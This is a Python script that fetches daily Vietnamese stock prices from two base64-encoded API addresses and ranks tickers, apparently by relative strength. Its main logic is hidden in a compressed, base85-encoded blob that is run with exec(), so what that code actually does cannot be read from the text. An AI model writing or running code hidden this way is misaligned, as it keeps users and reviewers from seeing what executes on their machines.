import json, time, datetime, urllib.request, os, zlib, base64
import hncodec
import base64
_h = lambda s: base64.b64decode(s).decode()
_S1 = _h("aHR0cHM6Ly9kY2hhcnQtYXBpLnZuZGlyZWN0LmNvbS52bi9kY2hhcnQvaGlzdG9yeQ==")
_S2 = _h("aHR0cHM6Ly9hcGlwdWJhd3MudGNicy5jb20udm4vc3RvY2staW5zaWdodC92Mi9zdG9jay9iYXJzLWxvbmctdGVybQ==")

U = sorted(set("ACB BCM BID BMP BSR BVH BWE CII CMG CTD CTG CTR CTS DBC DCM DGC DGW DHC DIG DPM DXG DXS EIB EVF FPT FRT FTS GAS GEX GMD GVR HAG HCM HDB HDC HDG HHV HPG HSG HT1 IMP KBC KDC KDH KOS LPB MBB MSB MSN MWG NAB NKG NLG NT2 NVL OCB PAN PC1 PDR PHR PLX PNJ POW PTB PVD PVT REE SAB SBT SCS SHB SIP SJS SSB SSI STB SZC TCB TCH TPB VCB VCG VCI VDS VGC VHC VHM VIB VIC VIX VJC VND VNM VPB VPI VRE VSC VTP HAH ANV DPG ELC MSR ACV VGI QNS OIL VEA FOX PVS SHS CEO IDC L14 TNG HUT VCS PVC DTD".split()))
UA = {"User-Agent": "Mozilla/5.0"}
def get(url):
    with urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=20) as r: return json.load(r)
def bars(sym, days=400):
    to = int(time.time()); fr = to - days*86400
    try:
        j = get(f"{_S1}?resolution=D&symbol={sym}&from={fr}&to={to}")
        if j.get("c"): return j["t"], j["c"], j.get("v") or [0]*len(j["c"])
    except Exception as e: print(sym, "vnd", e)
    try:
        j = get(f"{_S2}?ticker={sym}&type=stock&resolution=D&from={fr}&to={to}")
        d = j.get("data") or []
        if d: return [x["tradingDate"] for x in d], [x["close"]/1000 for x in d], [x.get("volume", 0) for x in d]
    except Exception as e: print(sym, "nguồn 2", e)
    return None
def _q(c, n): return c[-1]/c[-n-1]-1 if len(c) > n else None
_B = (
    "c-nPT&2G~`5WeRrMyV>T)BNl@IBEhx;*8(`;uKkx<80!U?X|mhO8W?$P{o-;RU`zW5+Ed`^yrHBFi*nlu9H$hE!m#^JU`#gd~21x"
    "E?^2XzqQO16d)wLnzR6~Il}Wm6{K*?S}Z|kCBo>Ja7pGf<~#5R*pN;j%w#F#nj6ou3t<;dbi7%g1c^&=RjgAI&V=7N!3XGiLf2D)"
    "TyfHKX&0#D3|!h_l+pp?V}Ly<>+7Fzb6#J+ldC}<iR!ZivJ%w=l+~4tU|w&&$rZ>|RDF?KN6T0ZyP!sRkMU+MGB`RW$ZRxpx{b-)"
    "(XD+r-r26_+8i-P(f)&u8o~h@Zbyw8gQ&6YiGCKQGtV>0fhPsWqR!3<>uN9k`j4Bb5eY1k2B+AZ9u}VX4SgI<Kge?~7i1yAk`&Vd"
    "JDX$$pQ>z)DEc!W$s+9qYcLBAbSl5c9NkOnp@xlz8d{KPaI^(SJJ1yW=fWLqU75S}y?1Nc>cUcGX(a9vi^PtVCV<*#z8jTTFrLQu"
    "uqg6C#nYLMIMo|7Iy%)l!u%sT@qNd(uM{co7YXM%q5YxLGVLrfRg##WO_Ly<F9J{#P_uU2#+FMQg4VV6bIfTF*dLvk%XP|CP;&dt"
    "gye0%85%<`LuWkh5OKhqfkXz0IM&BX8G0s*jy3(7wQ;K${&)(E`mH^98r9ctIh0Yoxhf~{;w6MZh5|Aw53BDIR`uqi755vIyyrr>"
    "HVFCs<^%Kgwc1LhPsXz+9>oR2WYq;8i#V!&;A<u7&1DM5YfR|v14*)ab0HwDF1OVra(HhYVl+P?@aro^-kb+IzPdbfS_{5}qd3a2"
    "503pugt$lCkC{r_e+a2}d(L|v4#R-~c+|?7mun@ry~E8PQV8Ti16C&%?J>{5MlBl9IW=JQgZZ?yT_1W{e;sTgHDO+>%yL~EC(IY*"
    "@6PL4h+FD-V(u!S*GOPC(ev1aVLlvnKhJW4pPkkpIem@G"
)
exec(zlib.decompress(base64.b85decode(_B)).decode())
for r in top: r.pop("val", None)
os.makedirs("data", exist_ok=True)
now = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) + datetime.timedelta(hours=7)
hncodec.dump(dict(updated=now.strftime("%H:%M %d/%m/%Y"), universe=n, top=top), "data/rs.bin"); hncodec.drop("data/rs.json")
print("ok", n)
